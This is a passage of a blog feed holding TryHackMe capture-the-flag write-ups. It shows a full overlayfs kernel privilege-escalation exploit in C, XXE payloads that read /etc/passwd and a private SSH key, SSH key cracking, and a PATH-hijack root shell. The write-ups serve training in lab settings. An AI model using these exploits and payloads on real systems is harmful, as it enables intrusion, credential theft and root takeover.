1) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
2) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
3) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
4) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;lrange&lt;/code&gt; is basically an iterator, going from value 0 to 9000. Looks like a base64 encoded string.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ echo &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot; | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! We have the exact syntax listed, which we can modify for our use. &lt;code&gt;127.0.0.1&lt;/code&gt; becomes &lt;code&gt;MACHINE_IP&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Using &lt;code&gt;rsync rsync://rsync-connect@MACHINE_IP&lt;/code&gt; we see an interesting directory. Continuing, we get &lt;code&gt;rsync rsync://rsync-connect@MACHINE_IP:/file/sys-internal/&lt;/code&gt;. Listing this looks like sys-internal&amp;rsquo;s file system. Using a bit of directory enumeration, we can get the user flag and the &lt;code&gt;id_rsa&lt;/code&gt;!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;h3 id=&#34;21-sneaking-in-ssh&#34;&gt;2.1 Sneaking in SSH&lt;/h3&gt;
&lt;p&gt;I checked the &lt;code&gt;.ssh&lt;/code&gt; directory, which seems to be empty. Putting in a file called &lt;code&gt;authorized_keys&lt;/code&gt; file contating our &lt;code&gt;id_rsa.pub&lt;/code&gt; will allow us to connect using SSH without as password ;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/.ssh]
└─$ rsync -ahv ./id_rsa.pub  rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/authorized_keys
Password: 
sending incremental file list
id_rsa.pub

sent 671 bytes  received 35 bytes  83.06 bytes/sec
total size is 563  speedup is 0.80
                                                            
┌──(kali㉿kali)-[~/.ssh]
└─$ rsync rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/                   
Password: 
drwxrwxr-x          4,096 2021/06/16 01:12:15 .
-rw-r--r--            563 2021/05/25 13:02:37 authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s login!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/.ssh]
└─$ ssh sys-internal@10.10.81.234                
The authenticity of host &#39;10.10.81.234 (10.10.81.234)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNngSiMUKWFTO6Vr4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.81.234&#39; (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;*in hacker voice* We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s check the common priv-esc vectors.&lt;/p&gt;
&lt;p&gt;SUID? sudo? crontab? nope. Kernel exploit?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys-internal@vulnnet-internal:~$ uname -a
Linux vulnnet-internal 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yes! We can use the &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/39230&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;overlayfs local priv esc exploit&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Use the following -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat &amp;lt;&amp;lt; EOF &amp;gt; filename.extension
{blah blah}
EOF
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;syntax to echo multiple lines in a file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys-internal@vulnnet-internal:~$ cat &amp;lt;&amp;lt;EOF&amp;gt;xpl.c
#define _GNU_SOURCE
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;err.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;sys/mount.h&amp;gt;

//#include &amp;lt;attr/xattr.h&amp;gt;
//#include &amp;lt;sys/xattr.h&amp;gt;
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    &amp;quot;./ovlcap&amp;quot;
#define DIR_WORK    DIR_BASE &amp;quot;/work&amp;quot;
#define DIR_LOWER   DIR_BASE &amp;quot;/lower&amp;quot;
#define DIR_UPPER   DIR_BASE &amp;quot;/upper&amp;quot;
#define DIR_MERGE   DIR_BASE &amp;quot;/merge&amp;quot;
#define BIN_MERGE   DIR_MERGE &amp;quot;/magic&amp;quot;
#define BIN_UPPER   DIR_UPPER &amp;quot;/magic&amp;quot;


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 &amp;amp;&amp;amp; errno != EEXIST)
        err(1, &amp;quot;mkdir %s&amp;quot;, path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, &amp;quot;open %s&amp;quot;, path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, &amp;quot;write %s&amp;quot;, path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, &amp;quot;open %s&amp;quot;, src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, &amp;quot;open %s&amp;quot;, dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, &amp;quot;read %s&amp;quot;, src);
        }

        char *p = buf;
        while (rd &amp;gt; 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, &amp;quot;write %s&amp;quot;, dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, &amp;quot;rm -rf &#39;%s/&#39;&amp;quot;, DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, &amp;quot;unshare&amp;quot;);

    xwritefile(&amp;quot;/proc/self/setgroups&amp;quot;, &amp;quot;deny&amp;quot;);

    sprintf(buf, &amp;quot;0 %d 1&amp;quot;, uid);
    xwritefile(&amp;quot;/proc/self/uid_map&amp;quot;, buf);

    sprintf(buf, &amp;quot;0 %d 1&amp;quot;, gid);
    xwritefile(&amp;quot;/proc/self/gid_map&amp;quot;, buf);

    sprintf(buf, &amp;quot;lowerdir=%s,upperdir=%s,workdir=%s&amp;quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount(&amp;quot;overlay&amp;quot;, DIR_MERGE, &amp;quot;overlay&amp;quot;, 0, buf) == -1)
        err(1, &amp;quot;mount %s&amp;quot;, DIR_MERGE);

    // all+ep
    char cap[] = &amp;quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&amp;quot;;

    xcopyfile(&amp;quot;/proc/self/exe&amp;quot;, BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, &amp;quot;security.capability&amp;quot;, cap, sizeof(cap) - 1, 0) == -1)
        err(1, &amp;quot;setxattr %s&amp;quot;, BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], &amp;quot;magic&amp;quot;) || (argc &amp;gt; 1 &amp;amp;&amp;amp; !strcmp(argv[1], &amp;quot;shell&amp;quot;))) {
        setuid(0);
        setgid(0);
        execl(&amp;quot;/bin/bash&amp;quot;, &amp;quot;/bin/bash&amp;quot;, &amp;quot;--norc&amp;quot;, &amp;quot;--noprofile&amp;quot;, &amp;quot;-i&amp;quot;, NULL);
        err(1, &amp;quot;execl /bin/bash&amp;quot;);
    }

    pid_t child = fork();
    if (child == -1)
        err(1, &amp;quot;fork&amp;quot;);

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, &amp;quot;shell&amp;quot;, NULL);
    err(1, &amp;quot;execl %s&amp;quot;, BIN_UPPER);
}
EOF
sys-internal@vulnnet-internal:~$ gcc xpl.c 
sys-internal@vulnnet-internal:~$ ./a.out 
bash-4.4# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Mustacchio Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-mustacchio-writeup/</link>
        <pubDate>Wed, 16 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-mustacchio-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/dorXlbA.png" alt="Featured image of post TryHackMe: Mustacchio Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/mustacchio&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA)
|   256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA)
|_  256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info Gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH open on 22&lt;/li&gt;
&lt;li&gt;Post 80 with a website open&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More information gathered later, as the full port scan takes a lot longer.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We could explore the last port later.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.247.224
/images               (Status: 301) [Size: 315] [--&amp;gt; http://10.10.247.224/images/]
/about.html           (Status: 200) [Size: 3152]                                  
/contact.html         (Status: 200) [Size: 1450]                                  
/index.html           (Status: 200) [Size: 1752]                                  
/blog.html            (Status: 200) [Size: 3172]                                  
/gallery.html         (Status: 200) [Size: 1950]                                  
/custom               (Status: 301) [Size: 315] [--&amp;gt; http://10.10.247.224/custom/]
/robots.txt           (Status: 200) [Size: 28]                                    
/fonts                (Status: 301) [Size: 314] [--&amp;gt; http://10.10.247.224/fonts/] 
/server-status        (Status: 403) [Size: 278]  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;custom looks interesting&lt;/li&gt;
&lt;li&gt;robots.txt usually contains intersting information&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;The homepage.
&lt;img src=&#34;https://i.imgur.com/yaN2Tqm.jpg&#34; alt=&#34;mustacchio homepage&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We explore the &lt;code&gt;/custom/&lt;/code&gt; page, and get another &lt;code&gt;/js/&lt;/code&gt; directory onwards.
&lt;img src=&#34;https://i.imgur.com/plsUh5V.png&#34; alt=&#34;mustacchio custom js webpage&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I first looked in &lt;code&gt;users.bak&lt;/code&gt;. We get something interesting!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat users.bak              
��r�CtableusersusersCREATE TABLE &amp;quot;users&amp;quot; (
        &amp;quot;id&amp;quot;    INTEGER,
        &amp;quot;username&amp;quot;      TEXT,
        &amp;quot;password&amp;quot;      TEXT,
        &amp;quot;role&amp;quot;  INTEGER
��2     ]admin{hash_was_here_and_i_hid_it_lol} 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-hash-cracking&#34;&gt;1.4. Hash Cracking&lt;/h3&gt;
&lt;p&gt;Looks like a hash for the username &lt;code&gt;admin&lt;/code&gt;. But, of what kind?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ hashid {hash_was_here_and_i_hid_this_too}   
Analyzing &#39;{yeee_hawww}&#39;
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using john the ripper, we get the password XD&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh admin@10.10.247.224
The authenticity of host &#39;10.10.247.224 (10.10.247.224)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:g//RSEsVCZF6FIydF0R24Gmek8fI6D7kRnDXF3fNK9Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.247.224&#39; (ECDSA) to the list of known hosts.
admin@10.10.247.224: Permission denied (publickey).
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And &amp;hellip; we see that we are not allowed :( At this point, we have one last option left.&lt;/p&gt;
&lt;h3 id=&#34;15-the-mystery-port--our-key-to-success&#34;&gt;1.5. The Mystery Port &amp;amp; Our &lt;em&gt;Key&lt;/em&gt; to Success&lt;/h3&gt;
&lt;p&gt;Exploring the last port, we get some more information.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s go!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/xazt9n0.png&#34; alt=&#34;admin panel on the new port found&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see an admin panel! Recall, we already have the credentials :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jYwwokH.jpg&#34; alt=&#34;a place to add comments in the admin panel&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see the following in the source code. &lt;code&gt;&amp;lt;!-- Barry, you can now SSH in using your key!--&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now what?&lt;/p&gt;
&lt;h3 id=&#34;16-xml&#34;&gt;1.6. XML&lt;/h3&gt;
&lt;p&gt;I opened up burp-suite, and I got the following.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /home.php HTTP/1.1
Host: 10.10.247.224:8765
...
Connection: close

xml=wow
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have a comment box that looks like a place to enter XML text, as we see in the POST request.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;root&amp;gt;

        &amp;lt;author&amp;gt;hacc&amp;lt;/author&amp;gt;
        &amp;lt;name&amp;gt;Hackerman&amp;lt;/name&amp;gt;
&amp;lt;/root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/25wZkxA.png&#34; alt=&#34;getting shady xml code to work&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Ey, Voila!&lt;/p&gt;
&lt;p&gt;I looked around, and I got &lt;a class=&#34;link&#34; href=&#34;https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;OWASP XXE&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we can craft a special tasty XXE attack.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE author [&amp;lt;!ENTITY read SYSTEM &#39;file:///etc/passwd&#39;&amp;gt;]&amp;gt;
&amp;lt;root&amp;gt;&amp;lt;author&amp;gt;&amp;amp;read;&amp;lt;/author&amp;gt;&amp;lt;/root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Explaination:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The first line is prolog&lt;/li&gt;
&lt;li&gt;The second line specifies something of &lt;code&gt;author&lt;/code&gt;, containing the information of the system file &lt;code&gt;/etc/passwd&lt;/code&gt; in a variable called &lt;code&gt;read&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;When we ask to display the author, we can put the &lt;code&gt;&amp;amp;read;&lt;/code&gt; in between the tags. This then prints the desired output.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ohm5FNi.jpg&#34; alt=&#34;admin panel displaying the /etc/passwd&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;17-ssh-keys&#34;&gt;1.7. SSH Keys&lt;/h3&gt;
&lt;p&gt;Using the above listing, we find two users, &lt;code&gt;joe&lt;/code&gt; and &lt;code&gt;barry&lt;/code&gt;. We see the hint given to us in the source code, to login SSH using Barry as username.&lt;/p&gt;
&lt;p&gt;We can modify the request as such:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE author [&amp;lt;!ENTITY read SYSTEM &#39;file:///home/barry/.ssh/id_rsa&#39;&amp;gt;]&amp;gt;
&amp;lt;root&amp;gt;
&amp;lt;author&amp;gt;&amp;amp;read;&amp;lt;/author&amp;gt;
&amp;lt;/root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we can get the private key! Use &lt;code&gt;chmod 600 id_rsa&lt;/code&gt; to assign appropriate permissions.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Trying the key, we see that we need a passphrase. We can use &lt;code&gt;ssh2john&lt;/code&gt; for this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ locate ssh2john
/usr/share/john/ssh2john.py

┌──(kali㉿kali)-[/tmp]
└─$ /usr/share/john/ssh2john.py id_rsa &amp;gt; hash
       
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                    
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{passphrase}       (id_rsa)
1g 0:00:00:03 DONE (2021-06-12 10:53) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/s     1990..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s login!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa barry@10.10.237.166
Enter passphrase for key &#39;id_rsa&#39;: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

13 packages can be updated.
10 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Sat Jun 12 13:20:56 2021 from 10.17.8.184
barry@mustacchio:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Okay now what? Sudo we can&amp;rsquo;t touch. Crontab empty. Linux kernel tip top. SUID?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ find / -type f -perm -u=s 2&amp;gt; /dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. So, &lt;code&gt;home/joe/live_log&lt;/code&gt; shows us the following.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ file /home/joe/live_log
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, let&amp;rsquo;s execute.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ /home/joe/live_log
10.17.8.184 - - [12/Jun/2021:09:09:41 +0000] &amp;quot;POST /home.php HTTP/1.1&amp;quot; 200 1123 &amp;quot;http://mustacchio.thm:8765/home.php&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&amp;quot;
10.17.8.184 - - [12/Jun/2021:09:09:47 +0000] &amp;quot;POST /home.php HTTP/1.1&amp;quot; 200 1123 &amp;quot;http://mustacchio.thm:8765/home.php&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&amp;quot;
...

^CLive Nginx Log 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It says it is &lt;code&gt;Live Nginx Log&lt;/code&gt;. We clearly need more information. What about the strings in the executable?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;...
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
...
crtstuff.c
...
demo.c
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks closely! We have &lt;code&gt;tail&lt;/code&gt; present. This is now a simle &lt;code&gt;PATH&lt;/code&gt; epxloit. 2 Simple steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We add the current path in the &lt;code&gt;PATH&lt;/code&gt; environment variable.&lt;/li&gt;
&lt;li&gt;We create an executable called &lt;code&gt;tail&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Step 1:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:~$ export PATH=$PWD:$PATH
barry@mustacchio:~$ echo $PATH
/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Step 2:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ cat tail
#!/usr/bin/python3
import pty
pty.spawn(&amp;quot;/bin/bash&amp;quot;)

barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ /home/joe/live_log
root@mustacchio:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System Compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: 0day Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-0day-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-0day-writeup/</guid>
        <description>&lt;img src="https://imgur.com/jJe7K0O.png" alt="Featured image of post TryHackMe: 0day Writeup" /&gt;&lt;p&gt;A pretty easy THM room. You just need to know what to do, and the rest is a cake-walk.&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/0day&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-enumeration-and-scanning&#34;&gt;1. Enumeration and Scanning&lt;/h2&gt;
&lt;h3 id=&#34;11-web-exploration&#34;&gt;1.1. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/jJe7K0O.png&#34; alt=&#34;The 0day website homepage&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We find the &lt;code&gt;/secret/&lt;/code&gt; directory in the enumeration.
&lt;img src=&#34;https://imgur.com/woRmoi9.png&#34; alt=&#34;The secret directory&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We find a &lt;code&gt;id_rsa&lt;/code&gt; key, in &lt;code&gt;/backup/&lt;/code&gt;&lt;/p&gt;
